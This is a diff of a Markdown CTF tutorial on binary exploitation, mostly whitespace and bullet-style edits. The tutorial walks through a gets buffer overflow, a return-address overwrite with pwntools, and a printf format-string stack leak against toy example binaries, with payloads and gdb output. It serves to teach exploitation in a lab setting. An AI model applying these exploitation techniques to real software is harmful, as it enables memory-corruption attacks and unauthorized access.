@@ -1,16 +1,17 @@
 # Binary Exploitation
 
 ## Prerequisite
-* Gnu debugger: gdb (you can use pwndbg/gdb-peda/gef to get better view)
-* UNIX like operating system to run the ELF (binary file)
-* Decompiler to get better understanding of the binary file itself (Ghidra/Hopper/IDA)
-* pwntool module
+
+- Gnu debugger: gdb (you can use pwndbg/gdb-peda/gef to get better view)
+- UNIX like operating system to run the ELF (binary file)
+- Decompiler to get better understanding of the binary file itself (Ghidra/Hopper/IDA)
+- pwntool module
 
 ## Usually these are the method to solve Simple Binary Exploitation
 
-* Brute Force
-* Use gdb and Decompiler
-* Use pwn modules on python
+- Brute Force
+- Use gdb and Decompiler
+- Use pwn modules on python
 
 ## Classic Buffer Overflow
 
@@ -49,13 +50,16 @@ int main(){
 	return 0;
 }
 ```
+
 If you look closely it has gets function, it didn't specify the buffer size so we can overflow it.  
 you can check the manual page of gets function with
+
 ```
 man gets
 ```
 
 The manual page says:
+
 ```
 gets()  reads  a  line  from  stdin into the buffer pointed to by s until either a terminating newline or EOF,
 which it replaces with a null byte ('\0').  No check for buffer overrun is performed
@@ -68,14 +72,15 @@ hi! change the string to >w< and you'll get your flag!
 your input:
 ```
 
-
 you can try to brute force it by using `pwn cyclic` or `pattern create` in gef. for example:
+
 ```
 pwn cyclic 16
 aaaabaaacaaadaaa
 ```
 
 it will create cyclic pattern that can determine spesific offset. if we input it to the system we will get
+
 ```
 hi! change the string to >w< and you'll get your flag!
 your input: aaaabaaacaaadaaa
@@ -83,9 +88,11 @@ string is: caaadaaa
 not yet :(
 keep trying!
 ```
-if we examine carefully, we have overwritten the `string[8]` with our input. Because the size of `input` variable is 8 bytes, if we supply the gets with more than 8 character it will overflow. In this case it will overflowing `string[8]`.  
 
-so the input has to be 8*`randomcharacter`+ >w<. Lets just A for the padding. so the payload will be
+if we examine carefully, we have overwritten the `string[8]` with our input. Because the size of `input` variable is 8 bytes, if we supply the gets with more than 8 character it will overflow. In this case it will overflowing `string[8]`.
+
+so the input has to be 8\*`randomcharacter`+ >w<. Lets just A for the padding. so the payload will be
+
 ```
 AAAAAAAA>w<
 ```
@@ -94,9 +101,10 @@ supply the payload in the binary and we got the flag.
 
 flag `CTF{buffer_overflo0o0o0ow}`
 
-## Overwrite return address 
+## Overwrite return address
 
 given the problem in example2.c (b0f1.c)
+
 ```c
 void readFlag(){
 	char flag[32];
@@ -109,7 +117,7 @@ void readFlag(){
 void vuln(){
 	char string[8] = "UwU";
 	char input[8];
-	
+
 	printf("your input: ");
 	gets(input);
 
@@ -131,11 +139,12 @@ int main(){
 }
 ```
 
-if we look carefully there are readFlag function that read and also puts the flag. But int main function we didn't call readFlag at all, we only call vuln. So how to execute the readFlag function without having in the main function?  
+if we look carefully there are readFlag function that read and also puts the flag. But int main function we didn't call readFlag at all, we only call vuln. So how to execute the readFlag function without having in the main function?
 
-vuln function still use gets, meaning it didn't save, it pwnable so we can exploit that and overwrite the return addres of vuln function to readFlag function.  
+vuln function still use gets, meaning it didn't save, it pwnable so we can exploit that and overwrite the return addres of vuln function to readFlag function.
 
-you can use decompiler or gdb to examine the function. lets use the default which is gdb and others default tools.  
+you can use decompiler or gdb to examine the function. lets use the default which is gdb and others default tools.
+
 ```
 readelf -s ./example2
 ```
@@ -170,7 +179,8 @@ We need to find insert breakpoint before and after we input to examine the stack
 ```
 gdb ./example
 ```
-to run the gdb  
+
+to run the gdb
 
 because our input in the vuln function we can disas vuln by using:
 
@@ -206,6 +216,7 @@ Dump of assembler code for function vuln:
 ```
 
 lets insert breakpoint at `0x000000000040074a` and `0x0000000000400754`
+
 ```
 b*0x000000000040074a
 Breakpoint 1 at 0x40074a
@@ -235,7 +246,7 @@ $rip   : 0x000000000040074a  →  <vuln+40> mov eax, 0x0
 
 if we look at the stack before input, the rip points to the return address of the vuln function. To run the readFlag function we must replace `0x000000000040074a` by readFlag address.
 
-so try to use the `cyclic` or `pattern create` in gef to find the offset (we know its 24 just to make sure)  
+so try to use the `cyclic` or `pattern create` in gef to find the offset (we know its 24 just to make sure)
 
 ```
 pattern create 24
@@ -255,7 +266,8 @@ stack
 0x00007fffffffdaf0│+0x0030: 0x00007ffff7ffc620  →  0x0005044800000000
 0x00007fffffffdaf8│+0x0038: 0x00007fffffffdbd8  →  0x00007fffffffde18  →  "/mnt/d/Coding/CTFs/CTFHaha/bof1/bof1"
 ```
-before input `$rip : 0x40074a` now `$rip : 0x400700` we have successfully change from 4a to 00 (because if we input 24 character the 25 character will be nullbytes which is \x00)  
+
+before input `$rip : 0x40074a` now `$rip : 0x400700` we have successfully change from 4a to 00 (because if we input 24 character the 25 character will be nullbytes which is \x00)
 
 So arrange the payload with padding 24 character and the readFlag address (remember we must change it to little endian first)
 
@@ -268,11 +280,14 @@ b'\xd7\x06@\x00\x00\x00\x00\x00'
 ```
 
 our payload is nonprintable character so how can we arrange it?  
-you can use either 
+you can use either
+
 ```
 python -c "print('A'*24 + '\xd7\x06@\x00\x00\x00\x00\x00')" | ./example1
 ```
+
 or
+
 ```
 offeset = 24
 readFlag = 0x00000000004006d7
@@ -284,12 +299,15 @@ use
 p.sendline(payload)
 p.interactive()
 ```
+
 to send the payload and enter interactive mode and youll get the flag.
 
 flag `CTF{ch4ng3_th3_progr4m_fl0o0w}`
 
 ## Fstring
+
 given the problem in example3.c (fstr0)
+
 ```c
 // gcc fstr0.c -o fstr0
 
@@ -320,23 +338,29 @@ int main() {
         return 0;
 }
 ```
-As we can see the input is sanitized by using fgets, it only accept 256 character so we cannot buffer offervlow it.  But if we look more closely, at the last line of vuln function there is `printf(name);`. F in printf stands for formatting. It can format our variabel with our desired format.  
+
+As we can see the input is sanitized by using fgets, it only accept 256 character so we cannot buffer offervlow it. But if we look more closely, at the last line of vuln function there is `printf(name);`. F in printf stands for formatting. It can format our variabel with our desired format.
 
 for example:
+
 ```
 printf("%d %d %d %d %d", 1, 2, 3, 4, 5);
 will output: 1 2 3 4 5
 ```
+
 we can also specify our desired format with `%n$...` for example:
+
 ```
 printf("%2$d %1$d %3$d %5$d %4$d", 1, 2, 3, 4, 5);
 will output : 2 1 3 5 4
 ```
-See the difference? So how can we exploit the formatting string. if we didn't specify any formatting in printf we can exploit it by using the format string itself. wait whattt? how?  
 
-because the printf didn't specify any formatting we can use for example: `%x` to print hexadecimal number but what hexadecimal would the printf print? becuase we input %x, the printf think that it needs hexadecimal number and it will grab one from the stack itself. if we put `%x %x %x %x %x` it will grab 5 hexadecimal from the stack because we didn't give the printf function to print to.  
+See the difference? So how can we exploit the formatting string. if we didn't specify any formatting in printf we can exploit it by using the format string itself. wait whattt? how?
+
+because the printf didn't specify any formatting we can use for example: `%x` to print hexadecimal number but what hexadecimal would the printf print? becuase we input %x, the printf think that it needs hexadecimal number and it will grab one from the stack itself. if we put `%x %x %x %x %x` it will grab 5 hexadecimal from the stack because we didn't give the printf function to print to.
 
 if we run the binary it will ask for input and if we use `%p %p %p %p %p`
+
 ```
 hi, welcome to fstring!
 what's your name?
@@ -344,7 +368,7 @@ what's your name?
 hello, 0x7ffc01c289e0 0x7fdebadae8c0 (nil) 0x7 (nil)
 ```
 
-as you can see it will output random value from the stack. if we look carefully the readFlag function is inside the vuln function itself so the flag must be in the stack, so we just need to find where the flag is. We can use `%x` or `%p` or even `%ld`  
+as you can see it will output random value from the stack. if we look carefully the readFlag function is inside the vuln function itself so the flag must be in the stack, so we just need to find where the flag is. We can use `%x` or `%p` or even `%ld`
 
 ```
 hi, welcome to fstring!
@@ -361,6 +385,7 @@ hello, 0x7ffc069220b0 0x7f9093e858c0 (nil) 0x7 (nil) 0x5f6573757b465443 0x635f66
 ```
 
 as you can see the first and second output is different. This happen because the aslr is active. ASLR stands for Address Space Layout Randomization or we can use `checksec` to check it
+
 ```
 checksec example2
     Arch:     amd64-64-little
@@ -369,14 +394,17 @@ checksec example2
     NX:       NX enabled
     PIE:      PIE enabled
 ```
+
 PIE (Positition Independent Executable) we can see the same as ASLR so it will make our function have offset so it will behave differently everytime. But as you can see the 6th address is the same, so maybe this is the flag?
+
 ```
-convert this to ascii 0x5f6573757b465443 0x635f66746e697270 0x796c6c7566657261 0x7f7d7a6c705f using python we get 0x70252070252070255 
+convert this to ascii 0x5f6573757b465443 0x635f66746e697270 0x796c6c7566657261 0x7f7d7a6c705f using python we get 0x70252070252070255
 
 it will give _esu{FTCc_ftnirpyllufera}zlp_p% p% p%
 ```
 
 it looks like the flag but reverse, remember our machine use little endian so we must reverse the byte itself to get the correct flag. After we reverse it we get the flag
+
 ```py
 flag = "0x5f6573757b465443-0x635f66746e697270-0x796c6c7566657261-0x7f7d7a6c705f"
 arrflag = flag.split("-")
@@ -387,4 +415,5 @@ for item in arrflag:
 
 print(ans.decode())
 ```
+
 and we get our desired flag: `CTF{use_printf_carefully_plz}`
